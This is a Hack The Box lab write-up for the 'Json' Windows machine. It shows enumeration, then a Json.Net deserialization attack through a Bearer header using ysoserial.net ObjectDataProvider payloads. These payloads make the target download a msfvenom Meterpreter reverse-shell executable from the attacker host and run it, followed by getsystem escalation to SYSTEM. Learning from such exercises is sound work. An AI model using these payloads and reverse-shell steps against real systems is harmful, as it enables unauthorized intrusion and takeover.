| Category          | Details                                                                |
|-------------------|------------------------------------------------------------------------|
| 📝 **Name**       | [Json](https://app.hackthebox.com/machines/Json)                       |  
| 🏷 **Type**       | HTB Machine                                                            |
| 🖥 **OS**         | Windows                                                                |
| 🎯 **Difficulty** | Medium                                                                 |
| 📁 **Tags**       | .NET deserialization, yoserial.net, Metasploit, SeImpersonatePrivilege |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ nmap -sS -sC -sV $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 17:25 +0200
Nmap scan report for 10.129.227.191
Host is up (0.065s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: Json HTB
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-13T15:26:07
|_  start_date: 2026-05-13T15:21:27
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:03:9b:92 (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.34 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ feroxbuster --url http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,js,png,jpg,py,txt,log,zip -C 404 -n
<SNIP>
200      GET        1l      142w     2357c http://10.129.227.191/js/app.min.js
<SNIP>
```

#### Access `js/app.min.js`
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ curl http://10.129.227.191/js/app.min.js
var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"]; angular[_0xd18f[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { _0x30f6x2[_0xd18f[17]] = { UserName: _0xd18f[18], Password: _0xd18f[18] }; _0x30f6x2[_0xd18f[19]] = { message: _0xd18f[18], show: false }; var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }; _0x30f6x2[_0xd18f[21]] = function () { _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])[_0xd18f[13]](function (_0x30f6x5) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }, function (_0x30f6x6) { _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23]; _0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true; console[_0xd18f[25]](_0x30f6x6) }) } }])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { _0x30f6x1[_0xd18f[5]](_0xd18f[14], { headers: { "\x42\x65\x61\x72\x65\x72": _0x30f6x4 } })[_0xd18f[13]](function (_0x30f6x5) { _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]] }, function (_0x30f6x6) { _0x30f6x3[_0xd18f[9]](_0xd18f[4]); window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] }) } else { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] } }]) 
```

#### Deobfuscate `js/app.min.js`
AI used to deobfuscate .js code.
```
angular.module("json", ["ngCookies"])

  .controller("loginController", ["$http", "$scope", "$cookies",
    function ($http, $scope, $cookies) {

      $scope.credentials = { UserName: "", Password: "" };
      $scope.error = { message: "", show: false };

      // If already authenticated, skip to index
      var token = $cookies.get("OAuth2");
      if (token) {
        window.location.href = "index.html";
      }

      $scope.login = function () {
        $http.post("/api/token", $scope.credentials)
          .then(
            function (success) {
              window.location.href = "index.html";
            },
            function (error) {
              $scope.error.message = "Invalid Credentials.";
              $scope.error.show = true;
              console.log(error);
            }
          );
      };
    }
  ])

  .controller("principalController", ["$http", "$scope", "$cookies",
    function ($http, $scope, $cookies) {

      var token = $cookies.get("OAuth2");

      if (token) {
        $http.get("/api/Account/", { headers: { "Bearer": token } })
          .then(
            function (response) {
              $scope.UserName = response.data.Name;
            },
            function (error) {
              $cookies.remove("OAuth2");
              window.location.href = "login.html";
            }
          );
      } else {
        window.location.href = "login.html";
      }

    }
  ]);
```

#### Enumerate `api/account` REST endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ curl http://$TARGET/api/account         
{"Message":"Authorization has been denied for this request."}

┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ curl http://$TARGET/api/account -H "Bearer: token"
{"Message":"An error has occurred.","ExceptionMessage":"Invalid format base64","ExceptionType":"System.Exception","StackTrace":null}
      
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ echo -n token | base64                                   
dG9rZW4=

┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ curl http://$TARGET/api/account -H "Bearer: dG9rZW4="
{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}
                                                                             
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ echo -n '{"$type":"token"}' | base64            
eyIkdHlwZSI6InRva2VuIn0=

┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ curl http://$TARGET/api/account -H "Bearer: eyIkdHlwZSI6InRva2VuIn0="
{"Message":"An error has occurred.","ExceptionMessage":"Type specified in JSON 'token' was not resolved. Path '$type', line 1, position 16.","ExceptionType":"Newtonsoft.Json.JsonSerializationException","StackTrace":"   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.ResolveTypeName(JsonReader reader, Type& objectType, JsonContract& contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, String qualifiedTypeName)\r\n   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.ReadMetadataProperties(JsonReader reader, Type& objectType, JsonContract& contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, Object existingValue, Object& newValue, String& id)\r\n   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.CreateObject(JsonReader reader, Type objectType, JsonContract contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, Object existingValue)\r\n   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.Deserialize(JsonReader reader, Type objectType, Boolean checkAdditionalContent)\r\n   at Newtonsoft.Json.JsonSerializer.DeserializeInternal(JsonReader reader, Type objectType)\r\n   at Newtonsoft.Json.JsonConvert.DeserializeObject(String value, Type type, JsonSerializerSettings settings)\r\n   at Newtonsoft.Json.JsonConvert.DeserializeObject[T](String value, JsonSerializerSettings settings)\r\n   at DemoAppExplanaiton.Controllers.AccountController.GetInfo() in C:\\Users\\admin\\source\\repos\\DemoAppExplanaiton\\DemoAppExplanaiton\\Controllers\\AccountController.cs:line 80\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass6_2.<GetExecutor>b__2(Object instance, Object[] methodParameters)\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ExecuteAsync(HttpControllerContext controllerContext, IDictionary`2 arguments, CancellationToken cancellationToken)\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ApiControllerActionInvoker.<InvokeActionAsyncCore>d__1.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ActionFilterResult.<ExecuteAsync>d__5.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Filters.AuthorizationFilterAttribute.<ExecuteAuthorizationFilterAsyncCore>d__3.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Dispatcher.HttpControllerDispatcher.<SendAsync>d__15.MoveNext()"}
```
This endpoint might be vulnerable to insecure JSON deserialization.

#### Start `tcpdump` for OOB verification
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

#### Generate and execute `ObjectDataProvider` gadget chain payload for ICMP OOB verification
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ PAYLOAD=$(wine ~/Tools/yoserial.net/ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "ping -n 4 $LHOST" 2> /dev/null)
curl http://$TARGET/api/account -H "Bearer: $PAYLOAD"
{"Message":"An error has occurred.","ExceptionMessage":"Unable to cast object of type 'System.Windows.Data.ObjectDataProvider' to type 'Newtonsoft.Json.Linq.JObject'.","ExceptionType":"System.InvalidCastException","StackTrace":"   at DemoAppExplanaiton.Controllers.AccountController.GetInfo() in C:\\Users\\admin\\source\\repos\\DemoAppExplanaiton\\DemoAppExplanaiton\\Controllers\\AccountController.cs:line 85\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass6_2.<GetExecutor>b__2(Object instance, Object[] methodParameters)\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ExecuteAsync(HttpControllerContext controllerContext, IDictionary`2 arguments, CancellationToken cancellationToken)\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ApiControllerActionInvoker.<InvokeActionAsyncCore>d__1.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ActionFilterResult.<ExecuteAsync>d__5.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Filters.AuthorizationFilterAttribute.<ExecuteAuthorizationFilterAsyncCore>d__3.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Dispatcher.HttpControllerDispatcher.<SendAsync>d__15.MoveNext()"}
```

#### Confirm RCE with ICMP OOB callback received
```
06:59:49.087194 IP 10.129.227.191 > 10.10.16.193: ICMP echo request, id 1, seq 9, length 40
06:59:49.087228 IP 10.10.16.193 > 10.129.227.191: ICMP echo reply, id 1, seq 9, length 40
06:59:50.122199 IP 10.129.227.191 > 10.10.16.193: ICMP echo request, id 1, seq 10, length 40
06:59:50.122237 IP 10.10.16.193 > 10.129.227.191: ICMP echo reply, id 1, seq 10, length 40
06:59:51.351774 IP 10.129.227.191 > 10.10.16.193: ICMP echo request, id 1, seq 11, length 40
06:59:51.351803 IP 10.10.16.193 > 10.129.227.191: ICMP echo reply, id 1, seq 11, length 40
06:59:52.274195 IP 10.129.227.191 > 10.10.16.193: ICMP echo request, id 1, seq 12, length 40
06:59:52.274223 IP 10.10.16.193 > 10.129.227.191: ICMP echo reply, id 1, seq 12, length 40
```

#### Generate `windows/x64/meterpreter/reverse_tcp` reverse shell and host it over HTTP
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe && \
python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Deliver reverse shell using `ObjectDataProvider` gadget chain
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ PAYLOAD=$(wine ~/Tools/yoserial.net/ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "powershell wget http://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe" 2> /dev/null)
curl http://$TARGET/api/account -H "Bearer: $PAYLOAD"
{"Message":"An error has occurred.","ExceptionMessage":"Unable to cast object of type 'System.Windows.Data.ObjectDataProvider' to type 'Newtonsoft.Json.Linq.JObject'.","ExceptionType":"System.InvalidCastException","StackTrace":"   at DemoAppExplanaiton.Controllers.AccountController.GetInfo() in C:\\Users\\admin\\source\\repos\\DemoAppExplanaiton\\DemoAppExplanaiton\\Controllers\\AccountController.cs:line 85\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass6_2.<GetExecutor>b__2(Object instance, Object[] methodParameters)\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ExecuteAsync(HttpControllerContext controllerContext, IDictionary`2 arguments, CancellationToken cancellationToken)\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ApiControllerActionInvoker.<InvokeActionAsyncCore>d__1.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ActionFilterResult.<ExecuteAsync>d__5.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Filters.AuthorizationFilterAttribute.<ExecuteAuthorizationFilterAsyncCore>d__3.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Dispatcher.HttpControllerDispatcher.<SendAsync>d__15.MoveNext()"}
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.193:4444
```

#### Spawn reverse shell using `ObjectDataProvider` gadget chain
```
┌──(magicrc㉿perun)-[~/attack/HTB Json]
└─$ PAYLOAD=$(wine ~/Tools/yoserial.net/ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "C:\Windows\Temp\shell.exe" 2> /dev/null)
curl http://$TARGET/api/account -H "Bearer: $PAYLOAD"
{"Message":"An error has occurred.","ExceptionMessage":"Unable to cast object of type 'System.Windows.Data.ObjectDataProvider' to type 'Newtonsoft.Json.Linq.JObject'.","ExceptionType":"System.InvalidCastException","StackTrace":"   at DemoAppExplanaiton.Controllers.AccountController.GetInfo() in C:\\Users\\admin\\source\\repos\\DemoAppExplanaiton\\DemoAppExplanaiton\\Controllers\\AccountController.cs:line 85\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass6_2.<GetExecutor>b__2(Object instance, Object[] methodParameters)\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ExecuteAsync(HttpControllerContext controllerContext, IDictionary`2 arguments, CancellationToken cancellationToken)\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ApiControllerActionInvoker.<InvokeActionAsyncCore>d__1.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ActionFilterResult.<ExecuteAsync>d__5.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Filters.AuthorizationFilterAttribute.<ExecuteAuthorizationFilterAsyncCore>d__3.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Dispatcher.HttpControllerDispatcher.<SendAsync>d__15.MoveNext()"}
```

#### Confirm foothold gained
```
[*] Sending stage (230982 bytes) to 10.129.227.191
[*] Meterpreter session 1 opened (10.10.16.193:4444 -> 10.129.227.191:52434) at 2026-05-14 07:01:27 +0200

meterpreter > getuid
Server username: JSON\userpool
```

#### Capture user flag
```
meterpreter > cat C:\\Users\\userpool\\Desktop\\user.txt 
1d13d3d54806d10915521f07c33e3abf
```

### Root flag

#### Escalate to `SYSTEM` by abusing `SeImpersonatePrivilege`
```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Capture root flag
```
meterpreter > cat C:\\Users\\superadmin\\Desktop\\root.txt 
0fed5880752486d8a501461ca46acaef
```
